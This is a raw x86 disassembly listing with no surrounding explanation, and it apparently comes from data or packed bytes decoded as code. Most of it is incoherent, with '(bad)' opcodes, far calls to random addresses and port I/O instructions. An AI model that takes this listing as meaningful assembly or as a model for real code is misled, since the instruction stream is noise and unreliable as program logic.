  40ff6c:	call   0x889d:0xd3101cac
  40ff73:	out    dx,eax
  40ff74:	mov    ebp,0x939b92d8
  40ff79:	retf   
  40ff7a:	mov    ebp,0xa0681e02
  40ff7f:	cli    
  40ff80:	push   ss
  40ff81:	in     al,0xe9
  40ff83:	out    dx,al
  40ff84:	leave  
  40ff85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff86:	nop
  40ff87:	out    dx,eax
  40ff88:	cmp    ebx,0xa95e3805
  40ff8e:	fnsave [eax]
  40ff90:	pop    ss
  40ff91:	in     al,0xa9
  40ff93:	es retf 0x0
	...
  40ffb3:	add    BYTE PTR ds:0x75d9e489,bl
  40ffb9:	inc    ebx
  40ffba:	adc    esi,edx
  40ffbc:	xor    DWORD PTR [eax+0x2],0x19
  40ffc0:	mov    cl,0x34
  40ffc2:	mov    BYTE PTR [esi],bl
  40ffc4:	sbb    DWORD PTR [eax+0x4],0xf95fb59a
  40ffcb:	out    dx,al
  40ffcc:	xchg   ecx,eax
  40ffcd:	and    edi,edx
  40ffcf:	(bad)  
  40ffd0:	jne    0x410001
  40ffd2:	inc    ebx
  40ffd3:	call   0xb4b4:0x951e7d63
  40ffda:	ds mov esi,0x9a03f9cd
  40ffe0:	in     eax,0x71
  40ffe2:	outs   dx,DWORD PTR ds:[esi]
  40ffe3:	arpl   WORD PTR [edi-0x356ae185],bx
  40ffe9:	popa   
  40ffea:	pop    ebp
  40ffeb:	adc    DWORD PTR [eax+0x2f55c164],edx
  40fff1:	outs   dx,DWORD PTR ds:[esi]
  40fff2:	jg     0x40ffe0
  40fff4:	add    al,bh
  40fff6:	(bad)  
  40fff7:	inc    DWORD PTR [edx]
  40fff9:	leave  
  40fffa:	mov    esi,0x2b5ee
  40ffff:	push   edi
  410000:	imul   esi,ebp,0x7
  410003:	push   0x41653c
  410008:	stos   DWORD PTR es:[edi],eax
  410009:	xchg   ebp,eax
  41000a:	dec    edx
  41000b:	push   ss
  41000c:	xor    al,0x4
  41000e:	add    esp,0x58
  410011:	or     eax,0x6f89e4b4
  410016:	std    
  410017:	call   0x41001c
	...
  410034:	add    BYTE PTR [eax],al
  410036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410037:	(bad)  
  410039:	dec    DWORD PTR [esi]
  41003b:	xchg   esp,eax
  41003c:	mov    eax,DWORD PTR [ebp-0x28df0]
  410042:	lods   eax,DWORD PTR ds:[esi]
  410043:	sbb    ah,cl
  410045:	inc    ebx
  410046:	xor    al,0x6a
  410048:	fdivr  DWORD PTR [edi-0x7afd67f3]
  41004e:	dec    ebp
  41004f:	mov    ah,0xfd
  410051:	mov    cl,BYTE PTR [ebx-0x22]
  410054:	add    al,BYTE PTR [eax]
  410056:	int    0x5d
  410058:	adc    eax,0x9bd8dff9
  41005d:	outs   dx,BYTE PTR ds:[esi]
  41005e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41005f:	mov    ah,0x7d
  410061:	test   BYTE PTR [ebx+0x5dfe8fe5],bl
  410067:	jno    0x41006b
  410069:	lea    edi,[eax-0x35]
  41006c:	add    edi,0xfffffffa
  41006f:	inc    edi
  410071:	mov    ds:0xbf85970c,eax
  410076:	imul   ebp,DWORD PTR [ebx+edi*2-0x7d80c23b],0xffffffdd
  41007e:	dec    esi
  41007f:	xchg   edi,eax
  410080:	jge    0x410006
  410082:	mov    cl,0xa2
  410084:	mov    ?,esi
  410086:	pop    ebp
  410087:	scas   eax,DWORD PTR es:[edi]
  410088:	ins    BYTE PTR es:[edi],dx
  410089:	dec    DWORD PTR ds:0xabf8797
  41008f:	adc    al,0xc4
  410091:	or     ebp,0xffffffcc
  410094:	cld    
  410095:	xor    cl,ch
  410097:	inc    ebp
  410098:	jge    0x41001e
	...
  4100b6:	add    BYTE PTR [eax],al
  4100b8:	rcl    DWORD PTR [edx-0x72],0xfe
  4100bc:	call   0x7f97:0x4ede0e94
  4100c3:	test   BYTE PTR [ecx+0x62],ch
  4100c6:	mov    ?,esi
  4100c8:	fnsave [ebp-0x8]
  4100cb:	lahf   
  4100cc:	pop    ds
  4100cd:	xlat   BYTE PTR ds:[ebx]
  4100ce:	add    eax,DWORD PTR [ebp-0x1c76ebb3]
  4100d4:	push   0x14738f0e
  4100d9:	pop    ebp
  4100da:	add    eax,DWORD PTR [eax]
  4100dc:	int    0xed
  4100de:	sbb    cl,bh
  4100e0:	data16 add BYTE PTR [edi-0x3a],bh
  4100e4:	dec    edx
  4100e5:	lea    ebp,[eax-0x677947c2]
  4100eb:	add    eax,0xc2202dda
  4100f0:	push   cs
  4100f1:	add    BYTE PTR [edx+edi*2+0x184c7f36],bl
  4100f8:	or     eax,DWORD PTR [eax]
  4100fa:	jmp    0x1211c431
  4100ff:	aaa    
  410100:	adc    BYTE PTR [ebx],0x35
  410103:	dec    esp
  410104:	(bad)  
  410105:	(bad)  
  410106:	call   0x166b960e
  41010b:	pushf  
  41010c:	mov    ebx,0x8603e843
  410111:	lds    ebx,FWORD PTR [eax-0x25a3fe72]
  410117:	inc    ebx
  410118:	or     eax,0x97ab77
	...
  410139:	add    BYTE PTR [edi],dl
  41013b:	rcr    ebp,0x87
  41013e:	lods   al,BYTE PTR ds:[esi]
  41013f:	(bad)  
  410140:	call   0x8d4b9948
  410145:	dec    ebx
  410146:	cmp    edi,0x17a503e8
  41014c:	and    eax,0xad790d05
  410151:	xor    ebp,DWORD PTR [edx-0x6714aee]
  410157:	push   edi
  410158:	fiadd  DWORD PTR [ebx+0xd]
  41015b:	leave  
  41015c:	test   eax,0x337b1a17
  410161:	mov    ebp,ds
  410163:	jp     0x4101d0
  410165:	arpl   WORD PTR [ecx+0x5234958c],ax
  41016b:	inc    edx
  41016c:	xchg   ecx,eax
  41016d:	pop    es
  41016e:	or     al,0x0
  410170:	jmp    0x80c15c03
  410175:	add    al,0xd8
  410177:	sub    eax,0x74856400
  41017c:	cli    
  41017d:	outs   dx,BYTE PTR ds:[esi]
  41017e:	cmp    DWORD PTR [edx+ebp*2],0xffffffe8
  410182:	and    al,0x8d
  410184:	imul   esp,esi,0xb1148cff
  41018a:	aas    
  41018b:	int3   
  41018c:	jmp    DWORD PTR [ebx+0x4e]
  41018f:	adc    eax,DWORD PTR [esi+0x74]
  410192:	xchg   ebp,eax
  410193:	ins    BYTE PTR es:[edi],dx
  410194:	cld    
  410195:	ds xchg ebx,eax
  410197:	cmp    al,0xff
  410199:	fsubr  QWORD PTR [esi-0x12]
  41019c:	aas    
  41019d:	jmp    0x4101a2
	...
  4101ba:	add    BYTE PTR [eax],al
  4101bc:	fidiv  WORD PTR [esi+0x44]
  4101bf:	and    DWORD PTR [ebp-0x6cdd687c],ecx
  4101c5:	mov    cl,BYTE PTR [edi+0x64]
  4101c8:	test   DWORD PTR [ebx-0x4],ebp
  4101cb:	push   cs
  4101cc:	cmp    DWORD PTR [ebx],0xffffffff
  4101cf:	fmul   st(6),st
  4101d1:	out    dx,al
  4101d2:	aas    
  4101d3:	jmp    0xd4b54d6d
  4101d8:	push   edi
  4101d9:	inc    esp
  4101da:	clc    
  4101db:	pop    esp
  4101dc:	mov    al,BYTE PTR [eax+ebx*4-0x1e]
  4101e0:	cwde   
  4101e1:	mov    cl,BYTE PTR [edi+0x6a]
  4101e4:	or     DWORD PTR [edx-0x79d66374],0x3f91cefe
  4101ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ef:	call   0xbe85c402
  4101f4:	push   cs
  4101f5:	mov    esi,DWORD PTR [ebp+edi*4-0x78]
  4101f9:	hlt    
  4101fa:	mov    bh,0xdb
  4101fc:	dec    esi
  4101fd:	add    BYTE PTR [eax],bh
  4101ff:	inc    esp
  410200:	cwde   
  410201:	adc    al,0x7
  410203:	fisttp DWORD PTR [esi-0x68]
  410206:	jno    0x4101f0
  410208:	push   cs
  410209:	add    BYTE PTR [eax+0x5c78802c],cl
  41020f:	add    BYTE PTR [ebp+edi*1+0x2f],bh
  410213:	je     0x410249
  410215:	add    al,0x8d
  410217:	inc    ebp
  410218:	mov    esp,ss
  41021a:	mov    WORD PTR [ebp-0x78],es
  41021d:	aam    0x8c
  41021f:	inc    ebp
	...
  41023c:	add    BYTE PTR [eax],al
  41023e:	in     al,0xd3
  410240:	imul   edi,edi,0x50f842b1
  410246:	dec    esi
  410247:	add    DWORD PTR [ebx+0x53],edx
  41024a:	lods   eax,DWORD PTR ds:[esi]
  41024b:	(bad)  
  41024d:	dec    DWORD PTR [ecx-0x55]
  410250:	adc    DWORD PTR [eax+0x34],eax
  410253:	push   es
  410254:	inc    esp
  410255:	in     al,dx
  410256:	pop    ds
  410257:	shl    BYTE PTR [edx+0xb],0x21
  41025b:	imul   edi,esi,0x838bf4ff
  410261:	in     al,0xf4
  410263:	(bad)  
  410264:	(bad)  
  410265:	cmp    cl,al
  410267:	jbe    0x410276
  410269:	test   BYTE PTR [edx],dl
  41026b:	add    al,0x0
  41026d:	add    BYTE PTR [edi-0x1ba2c88c],ah
  410273:	mov    eax,DWORD PTR [edx+edi*4-0x7300011c]
  41027a:	test   eax,0xf98b4e72
  41027f:	jnp    0x4102e9
  410281:	pop    ss
  410282:	jecxz  0x410236
  410284:	scas   al,BYTE PTR es:[edi]
  410285:	push   ebx
  410286:	jecxz  0x410219
  410288:	xor    dl,BYTE PTR [ebx]
  41028a:	in     al,0x3
  41028c:	test   eax,eax
  41028e:	mov    ds:0xb4009381,eax
  410293:	dec    BYTE PTR [edx-0x3e48a7bb]
  410299:	movaps xmm1,XMMWORD PTR [ecx]
  41029c:	(bad)  
  41029d:	push   DWORD PTR [ecx+ecx*1-0x74]
  4102a1:	mov    al,ds:0x0
	...
  4102be:	add    BYTE PTR [eax],al
  4102c0:	mov    eax,ds:0xd51fd7b
  4102c5:	jb     0x4102d9
  4102c7:	adc    BYTE PTR [ebp+0x6],ah
  4102ca:	fadd   DWORD PTR [ecx]
  4102cc:	or     eax,0xf373c31d
  4102d1:	sbb    eax,DWORD PTR [esi-0x73eea969]
  4102d7:	dec    edi
  4102d8:	and    BYTE PTR [ebx],0x63
  4102db:	cld    
  4102dc:	dec    edx
  4102dd:	and    DWORD PTR [ebx],esi
  4102df:	push   eax
  4102e0:	xor    eax,0x3aff8d3e
  4102e5:	sbb    eax,ebx
  4102e7:	jae    0x4102c4
  4102e9:	sub    eax,DWORD PTR [esi-0x73bed761]
  4102ef:	dec    edi
  4102f0:	xor    eax,0xd01ed96
  4102f5:	sbb    eax,0x2bcb73c3
  4102fa:	xchg   BYTE PTR [edi+0x4f8be304],cl
  410300:	jne    0x410319
  410302:	add    eax,DWORD PTR [eax]
  410304:	adc    DWORD PTR [edx+0x7d],ecx
  410307:	test   BYTE PTR [ebp+0x3dfe8bfc],ch
  41030d:	call   0x298:0xa26f
  410313:	test   ebp,ecx
  410315:	or     ebx,ebx
  410317:	push   edx
  410318:	and    BYTE PTR [ebx+esi*2],0xf8
  41031c:	retf   0x33a2
  41031f:	push   ebx
  410320:	mov    ch,0x5
  410322:	mov    ecx,0xff
	...
  41033f:	add    BYTE PTR [eax],al
  410341:	add    BYTE PTR [edx+0x1b73c41b],bh
  410347:	sub    al,0x81
  410349:	(bad)  
  41034a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41034b:	ret    0x4f8a
  41034e:	xchg   esi,eax
  41034f:	in     al,0x8f
  410351:	(bad)  
  410352:	sbb    eax,0x9244c0a7
  410357:	cwde   
  410358:	call   0x838b:0xa6008623
  41035f:	adc    edx,DWORD PTR [ebp-0x62fde75]
  410365:	inc    ebx
  410366:	or     eax,0x5d10d242
  41036b:	stc    
  41036c:	push   0x42
  41036e:	bound  ecx,QWORD PTR [ecx-0x781e7483]
  410374:	jne    0x410367
  410376:	and    ch,ch
  410378:	sub    BYTE PTR [esp+ecx*4],al
  41037b:	or     edx,DWORD PTR [ebp-0x62]
  41037e:	inc    edx
  41037f:	mov    eax,ebp
  410381:	cli    
  410382:	mov    ss,WORD PTR [ebp+0x7b338b56]
  410388:	arpl   WORD PTR [edi+eiz*1-0x77],bp
  41038c:	inc    ebp
  41038d:	xor    al,0xb7
  41038f:	(bad)  
  410390:	ror    BYTE PTR [edx+0x46900b2],cl
  410396:	or     eax,0x62f12e2d
  41039b:	in     eax,dx
  41039c:	test   al,0x3
  41039e:	mov    BYTE PTR [edi-0x7d76306d],bh
  4103a4:	js     0x410333
	...
  4103c2:	add    BYTE PTR [eax],al
  4103c4:	xrelease mov BYTE PTR [eax-0x170072e5],bh
  4103cb:	(bad)  
  4103cc:	cmp    edi,DWORD PTR [ebx+0x63]
  4103cf:	ins    BYTE PTR es:[edi],dx
  4103d0:	xlat   BYTE PTR ds:[ebx]
  4103d1:	mov    ch,dh
  4103d3:	xor    edi,DWORD PTR [esi]
  4103d5:	cwde   
  4103d6:	push   es
  4103d7:	dec    edx
  4103d8:	or     eax,0x3ec36c00
  4103dd:	repnz cmp DWORD PTR [ecx-0x6f],edi
  4103e1:	outs   dx,DWORD PTR ds:[esi]
  4103e2:	iret   
  4103e3:	mov    dh,BYTE PTR [ebx+0x129c3a2f]
  4103e9:	mov    ebx,0xbf8903e8
  4103ee:	xor    al,0x0
  4103f0:	rol    DWORD PTR [edx+0x0],cl
  4103f3:	mov    dh,0x9
  4103f5:	jbe    0x41043b
  4103f7:	scas   al,BYTE PTR es:[edi]
  4103f8:	aaa    
  4103f9:	sub    bl,BYTE PTR [ebx-0x50]
  4103fc:	dec    ebx
  4103fd:	xor    ecx,DWORD PTR [ebx-0x7c6b6e73]
  410403:	out    0xe,al
  410405:	add    BYTE PTR [ebx+0x37],dl
  410408:	push   ds
  410409:	jnp    0x4103bf
  41040b:	jmp    0x923f8d8f
  410410:	aaa    
  410411:	adc    al,0x0
  410413:	jmp    0x64cdf808
  410418:	rcl    BYTE PTR [eax+0x7cfe66fe],0xca
  41041f:	pop    esi
  410420:	sbb    BYTE PTR [eax],al
  410422:	lea    ebx,[esi+ebp*8+0x4efe88]
	...
  410445:	add    BYTE PTR [ebx-0x56b21843],ch
  41044b:	(bad)  
  41044c:	jmp    DWORD PTR [ebx+0x4e]
  41044f:	or     bl,BYTE PTR ds:0x68384c62
  410455:	imul   esi,DWORD PTR [edx+eax*2-0x78728c00],0x37871efa
  410460:	call   0xfec889c4
  410465:	fs into 
  410467:	not    BYTE PTR [ecx+ebp*1-0xf8bb89e]
  41046e:	ret    
  41046f:	inc    edi
  410470:	gs pusha 
  410472:	lea    eax,[edi+0x7a94eefa]
  410478:	cmp    al,0xad
  41047a:	mov    eax,0x3a6bffc7
  41047f:	xchg   edx,edi
  410481:	(bad)  
  410482:	test   BYTE PTR [edi],dh
  410484:	push   DWORD PTR [esi+0x8cec0b]
  41048a:	xor    DWORD PTR [esi],ebp
  41048c:	idiv   edi
  41048e:	pop    ebx
  41048f:	int3   
  410490:	imul   eax,DWORD PTR [eax],0x8baff729
  410496:	mov    bh,0x64
  410498:	xchg   esp,eax
  410499:	mov    eax,ds:0xc0850375
  41049e:	sbb    bl,BYTE PTR [edi-0x1bcb3977]
  4104a4:	xchg   eax,esp
  4104a6:	aaa    
  4104a7:	cld    
  4104a8:	mov    WORD PTR [ebp+0x0],es
	...
  4104c6:	add    BYTE PTR [eax],al
  4104c8:	mov    WORD PTR [ebx-0x3],?
  4104cb:	push   esp
  4104cd:	arpl   WORD PTR [esi-0x3],sp
  4104d0:	add    eax,DWORD PTR fs:[ebp-0x40e99440]
  4104d7:	test   ah,dh
  4104d9:	test   BYTE PTR [eax],0x33
  4104dc:	in     al,0xe1
  4104de:	mov    BYTE PTR [ebp-0x28524],al
  4104e4:	leave  
  4104e5:	push   es
  4104e6:	idiv   ecx
  4104e8:	retf   
  4104e9:	js     0x410539
  4104eb:	inc    DWORD PTR [ebx]
  4104ed:	jns    0x410522
  4104ef:	cld    
  4104f0:	sar    BYTE PTR [eax+eax*1],0x83
  4104f4:	jmp    0xf484e19b
  4104f9:	cld    
  4104fa:	(bad)  
  4104fb:	adc    eax,0x3e8e54
  410500:	inc    ebp
  410501:	cld    
  410502:	in     al,0x43
  410504:	hlt    
  410505:	mov    bl,0xc1
  410507:	je     0x4104e5
  410509:	retf   
  41050a:	dec    edi
  41050b:	inc    ecx
  41050d:	sahf   
  41050e:	adc    DWORD PTR [eax-0x1c],eax
  410511:	push   0x40
  410513:	pop    ebx
  410514:	mov    ah,0x2
  410516:	lea    ecx,[ebp-0x2814c]
  41051c:	fdivr  QWORD PTR [edx]
  41051e:	sbb    al,BYTE PTR [edx]
  410520:	or     eax,0xa58c7599
  410525:	scas   eax,DWORD PTR es:[edi]
  410526:	xchg   esi,edi
  410528:	mov    ch,0x6b
  41052a:	jmp    0x41052d
	...
  410548:	add    BYTE PTR [eax],al
  41054a:	or     eax,0x888cf033
  41054f:	push   0xffffff8a
  410551:	dec    BYTE PTR [edx-0x6fffe218]
  410557:	jecxz  0x4105d4
  410559:	mov    cl,BYTE PTR [esi+0x70]
  41055c:	mul    DWORD PTR [eax-0x408266f4]
  410562:	jmp    0x410523
  410564:	jne    0x4105da
  410566:	inc    ebp
  410567:	inc    eax
  410568:	push   ecx
  410569:	call   FWORD PTR [edx-0x68]
  41056c:	call   0xd08d:0x297cc72
  410573:	and    BYTE PTR [ebx],dh
  410575:	mov    ecx,DWORD PTR [ebx+0x48]
  410578:	jne    0x4104fe
  41057a:	xor    eax,0xddfe882c
  41057f:	inc    eax
  410580:	scas   al,BYTE PTR es:[edi]
  410581:	sti    
  410582:	or     eax,0x12bf7d99
  410587:	and    al,0xc3
  410589:	or     DWORD PTR [ebp+0x4b],0xfffffff9
  41058d:	xor    cl,BYTE PTR [ebp-0x4a]
  410590:	jns    0x410516
  410592:	add    eax,0x90fe87cc
  410597:	adc    al,0x8b
  410599:	repz cli 
  41059b:	out    0x32,al
  41059d:	push   0x8002970c
  4105a2:	jmp    0x7b97:0x4d12628c
  4105a9:	xor    al,0xc5
  4105ab:	stos   DWORD PTR es:[edi],eax
  4105ac:	inc    edx
	...
  4105c9:	add    BYTE PTR [eax],al
  4105cb:	add    BYTE PTR [eax-0x35086cec],al
  4105d1:	xchg   esi,eax
  4105d2:	xor    DWORD PTR [ebp-0x7816ff78],ecx
  4105d8:	mov    ebx,0xd8873885
  4105dd:	jae    0x41064a
  4105df:	cld    
  4105e0:	test   al,0x85
  4105e2:	int    0x34
  4105e4:	nop
  4105e5:	jnp    0x4105a7
  4105e7:	lea    ebx,[ebx-0x4778e77b]
  4105ed:	jae    0x410662
  4105ef:	hlt    
  4105f0:	mov    eax,DWORD PTR [ebp+0xa74cad]
  4105f6:	jmp    0x28f16afe
  4105fb:	add    eax,0xfc6b730d
  410600:	push   0x90348d85
  410605:	jnp    0x41067f
  410607:	mov    WORD PTR [ebx-0x7b],ds
  41060a:	sbb    BYTE PTR [ecx-0x77],bh
  41060d:	clc    
  41060e:	jbe    0x410597
  410610:	dec    ebx
  410611:	xor    BYTE PTR [ecx+eax*4+0x32],bl
  410615:	mov    BYTE PTR [ebp-0x79],ah
  410618:	retf   0x2578
  41061b:	xor    al,0x72
  41061d:	or     al,0xed
  41061f:	add    ecx,DWORD PTR ds:0x32849373
  410625:	test   DWORD PTR [ebp-0x64],eax
  410628:	call   FWORD PTR [ecx-0x19]
  41062b:	add    ecx,DWORD PTR [esi+0x80dcbc]
	...
  41064d:	add    dl,cl
  41064f:	add    eax,0x2fc87ae1
  410654:	adc    DWORD PTR [esi-0x331700a1],esp
  41065a:	adc    DWORD PTR [eax],eax
  41065c:	or     al,0x43
  41065e:	or     eax,0xd19e10b
  410663:	test   ebx,ebx
  410665:	inc    edi
  410666:	cld    
  410667:	aas    
  410668:	jmp    0x3fe6b9
  41066d:	call   0xe9c57980
  410672:	xchg   ebx,eax
  410673:	test   esi,edi
  410675:	scas   eax,DWORD PTR es:[edi]
  410676:	push   cs
  410677:	add    BYTE PTR [eax+0x30],al
  41067a:	sbb    al,0x87
  41067c:	pop    esi
  41067d:	aaa    
  41067e:	inc    ecx
  41067f:	add    BYTE PTR [ebx-0x60],bl
  410682:	iret   
  410683:	sub    ecx,DWORD PTR [ebx+0x17988fd5]
  410689:	sbb    bh,BYTE PTR [esi+0x3e1a55a9]
  41068f:	xor    DWORD PTR [ebx+0x202601a6],ecx
  410695:	jo     0x4106ca
  410697:	fmul   QWORD PTR [eax-0x7263aec2]
  41069d:	xor    dl,BYTE PTR [ecx]
  41069f:	add    BYTE PTR [ecx+ebp*4-0x16487fa5],al
  4106a6:	push   cs
  4106a7:	add    BYTE PTR [edi+0x6c],dl
  4106aa:	std    
  4106ab:	xchg   edi,eax
  4106ac:	out    0xe7,eax
  4106ae:	idiv   edi
  4106b0:	jmp    DWORD PTR [eax+eax*1+0x0]
	...
  4106d0:	dec    esi
  4106d1:	cmc    
  4106d2:	or     DWORD PTR [esi+0x7000000e],0xffffffe5
  4106d9:	(bad)
  4106dd:	cdq    
  4106de:	add    DWORD PTR [edx],ebx
  4106e0:	jbe    0x4106f8
  4106e2:	add    eax,0x4f87cd74
  4106e7:	xchg   esi,eax
  4106e8:	jbe    0x4106ec
  4106ea:	pop    ebx
  4106eb:	jmp    0xdf03cdfe
  4106f0:	cmp    BYTE PTR [edi+edi*8-0x18],0xe
  4106f5:	jg     0x4106ee
  4106f7:	in     al,0x1d
  4106f9:	push   ds
  4106fa:	mov    ebp,DWORD PTR [esi+edx*4+0x64f146ce]
  410701:	xor    bl,BYTE PTR [eax]
  410703:	add    BYTE PTR [eax+ecx*8+0x9da33fb],dl
  41070a:	xlat   BYTE PTR ds:[ebx]
  41070b:	add    esp,DWORD PTR [ecx-0x43ba7891]
  410711:	xchg   ecx,eax
  410712:	jae    0x410708
  410714:	daa    
  410715:	rol    DWORD PTR [ebx],0x83
  410718:	jp     0x410716
  41071a:	cmp    dh,BYTE PTR [ebp-0x30]
  41071d:	cmc    
  41071e:	cmp    esi,DWORD PTR [edx-0x57]
  410721:	mov    eax,0xb2dbe85b
  410726:	cmp    eax,DWORD PTR [eax]
  410728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410729:	pop    ds
  41072a:	push   DWORD PTR [esi+0x12]
  41072d:	out    0xff,al
  41072f:	push   ebp
  410730:	daa    
  410731:	or     esi,eax
  410733:	call   0x410738
	...
  410750:	add    BYTE PTR [eax],al
  410752:	jns    0x41072c
  410754:	(bad)  
  410755:	(bad)  
  410756:	call   0xf7847a16
  41075b:	les    ebx,FWORD PTR [edi]
  41075d:	add    ebp,ebp
  41075f:	(bad)  
  410761:	mov    DWORD PTR [ecx+0x73],ebx
  410764:	adc    DWORD PTR [edi+0x48],0xc045f5ff
  41076b:	(bad)  
  41076c:	je     0x4106fe
  41076e:	mov    bh,0xfa
  410770:	test   DWORD PTR [eax],0x47fe095a
  410776:	sbb    al,0x69
  410778:	xor    DWORD PTR [ebx],0xffffffdf
  41077b:	sar    dh,1
  41077d:	jne    0x410737
  41077f:	or     dh,al
  410781:	call   FWORD PTR [ecx+0x6f]
  410784:	out    0xe2,al
  410786:	outs   dx,BYTE PTR ds:[esi]
  410787:	(bad)  
  410788:	inc    DWORD PTR [ebx-0xf00fcc]
  41078e:	sti    
  41078f:	jnp    0x4107a4
  410791:	pop    esp
  410792:	idiv   BYTE PTR [esi]
  410794:	add    BYTE PTR [ebp-0x4ffc0fdc],al
  41079a:	or     eax,0x1f019798
  41079f:	fldenv ds:0x78d5c45b
  4107a5:	add    eax,0x7385008e
  4107aa:	push   ss
  4107ab:	adc    al,0xc4
  4107ad:	jae    0x4107b9
  4107af:	imul   eax,DWORD PTR [ebx+0x4286f914],0x0
	...
  4107d1:	add    BYTE PTR [eax],al
  4107d3:	add    BYTE PTR [esi+0x44cc9a5a],al
  4107d9:	cdq    
  4107da:	add    dl,BYTE PTR [esi-0x4b]
  4107dd:	loope  0x410829
  4107df:	add    BYTE PTR ds:0x3cc2bd0e,cl
  4107e5:	jmp    0x410813
  4107e7:	push   0x3d
  4107e9:	shl    eax,0xb8
  4107ec:	or     al,0x99
  4107ee:	jge    0x4107af
  4107f0:	add    ebx,edi
  4107f2:	js     0x41083f
  4107f4:	sub    DWORD PTR [ebp+0x156a077f],ecx
  4107fa:	cmp    ecx,DWORD PTR [eax]
  4107fc:	bound  edx,QWORD PTR ds:0x155a0c3b
  410802:	and    edx,DWORD PTR [eax]
  410804:	or     eax,0xd142316
  410809:	and    BYTE PTR [ebx],bh
  41080b:	sbb    BYTE PTR [esi-0x1fe67f8],dl
  410811:	and    bh,BYTE PTR [esi-0xb]
  410814:	mov    eax,0x36bfcf9c
  410819:	mov    ?,WORD PTR [edi+0x43]
  41081c:	jmp    0x853e7fa9
  410821:	xchg   edx,eax
  410822:	call   0xcd83:0x83c113b7
  410829:	inc    esp
  41082a:	sti    
  41082b:	out    0x9f,eax
  41082d:	rol    BYTE PTR [ebx+0xd00e6fe],cl
  410833:	js     0x4107fd
  410835:	and    DWORD PTR [edi+0x2a],edi
	...
  410853:	add    BYTE PTR [eax],al
  410855:	add    bh,cl
  410857:	clc    
  410858:	call   0x69d59e8b
  41085d:	xchg   edi,eax
  41085e:	add    ch,BYTE PTR ds:0xf449769f
  410864:	cwde   
  410865:	test   BYTE PTR [ecx-0xc],al
  410868:	mov    ecx,0x73815fa8
  41086d:	sti    
  41086e:	mov    dl,0x3a
  410870:	into   
  410871:	add    al,0xd
  410873:	ja     0x410898
  410875:	or     al,0xe6
  410877:	mov    esp,0x6987e5
  41087c:	jmp    0x1a3f2f84
  410881:	xlat   BYTE PTR ds:[ebx]
  410882:	xchg   DWORD PTR [ecx-0x18db30],edi
  410888:	call   0x6532cb14
  41088d:	mov    ?,WORD PTR [edx-0x7f]
  410890:	call   0x914c8a6f
  410895:	ins    BYTE PTR es:[edi],dx
  410896:	pop    ecx
  410897:	daa    
  410898:	jmp    0x150191a0
  41089d:	add    DWORD PTR [esi-0x37c91ec7],eax
  4108a3:	div    DWORD PTR [ecx+0x39]
  4108a6:	fldln2 
  4108a8:	sub    BYTE PTR [esp+edx*4],al
  4108ab:	cmp    esi,DWORD PTR [ebp-0x72]
  4108ae:	shl    edi,cl
  4108b0:	mov    ecx,0x6b87c98b
  4108b5:	leave  
  4108b6:	es xor bl,al
  4108b9:	or     BYTE PTR [eax],al
	...
  4108d7:	add    BYTE PTR [eax+0x1bd4553b],dl
  4108dd:	leave  
  4108de:	inc    ebp
  4108df:	pop    edx
  4108e0:	mov    eax,eax
  4108e2:	mov    ah,0x42
  4108e4:	mov    es,WORD PTR [edx]
  4108e6:	add    BYTE PTR ds:0x9a390b14,dh
  4108ec:	popf   
  4108ed:	cmp    edi,esp
  4108ef:	mov    ecx,0x1e080b8f
  4108f4:	in     al,0xf4
  4108f6:	(bad)  
  4108f7:	fimul  WORD PTR [edi-0x2ad67b56]
  4108fd:	fimul  DWORD PTR [edx+0x44c706ac]
  410903:	std    
  410904:	(bad)
  410907:	scas   al,BYTE PTR es:[edi]
  410908:	out    dx,al
  410909:	(bad)  
  41090a:	(bad)  
  41090b:	mov    dh,0x21
  41090d:	and    DWORD PTR [esi+eiz*8],esp
  410910:	(bad)  
  410911:	fdivr  st,st(6)
  410913:	hlt    
  410914:	jmp    0xc0b:0x8fe93fed
  41091b:	sar    DWORD PTR [eax+ecx*2-0xa11700],0xea
  410923:	or     DWORD PTR [edx-0x7f],esp
  410926:	je     0x4108ed
  410928:	xchg   ebx,eax
  410929:	mov    ecx,0x98e934fe
  41092e:	xchg   ebp,eax
  41092f:	inc    eax
  410930:	or     DWORD PTR [eax],eax
  410932:	call   esi
  410934:	(bad)  
  410935:	jmp    0x410992
  410937:	sti    
  410938:	dec    esi
  410939:	cmp    ch,0x14
	...
  410958:	add    BYTE PTR [eax],al
  41095a:	std    
  41095b:	xchg   edi,eax
  41095c:	sub    eax,DWORD PTR [ecx+0x9]
  41095f:	add    BYTE PTR [edx],dh
  410961:	test   eax,0xabc9252c
  410966:	push   ss
  410967:	add    BYTE PTR [ebp+0x62],dl
  41096a:	stos   BYTE PTR es:[edi],al
  41096b:	jge    0x410958
  41096d:	stc    
  41096e:	pop    ebx
  41096f:	jne    0x4109ce
  410971:	cmc    
  410972:	inc    edi
  410973:	jne    0x4109f2
  410975:	stc    
  410976:	mov    bl,0xc6
  410978:	imul   esp,esp,0xf83b7d
  41097e:	je     0x410926
  410980:	out    0x81,al
  410982:	lods   eax,DWORD PTR ds:[esi]
  410983:	add    eax,DWORD PTR [eax]
  410985:	cmp    DWORD PTR [eax+ecx*1],0x75
  410989:	cmp    BYTE PTR [edi+0x48],ch
  41098c:	div    BYTE PTR [ebx]
  41098e:	mov    ds:0x84d8a1b,al
  410993:	xor    eax,0x5369184e
  410998:	add    ecx,DWORD PTR [ecx-0x5fe0c77]
  41099e:	pop    ebp
  41099f:	pusha  
  4109a0:	repnz and DWORD PTR [edi],0x3
  4109a4:	mov    DWORD PTR [ebp-0x44],eax
  4109a7:	mov    cl,BYTE PTR [ebx-0x4]
  4109aa:	ret    0xffc3
  4109ad:	je     0x41094f
  4109af:	xchg   BYTE PTR [esi-0x1925e8b],bh
  4109b5:	push   edx
  4109b6:	jecxz  0x410944
  4109b8:	(bad)  
  4109b9:	call   0x3f64cb
	...
  4109da:	add    BYTE PTR [eax],al
  4109dc:	and    ah,al
  4109de:	jae    0x410997
  4109e0:	xchg   bl,al
  4109e2:	pop    ebp
  4109e3:	pop    ebx
  4109e4:	lods   eax,DWORD PTR ds:[esi]
  4109e5:	lds    ecx,FWORD PTR [ecx+0x448bb445]
  4109eb:	or     bh,bh
  4109ed:	inc    esi
  4109ee:	repnz mov DWORD PTR [edx],esi
  4109f1:	adc    BYTE PTR [ecx+0x5c8a647e],cl
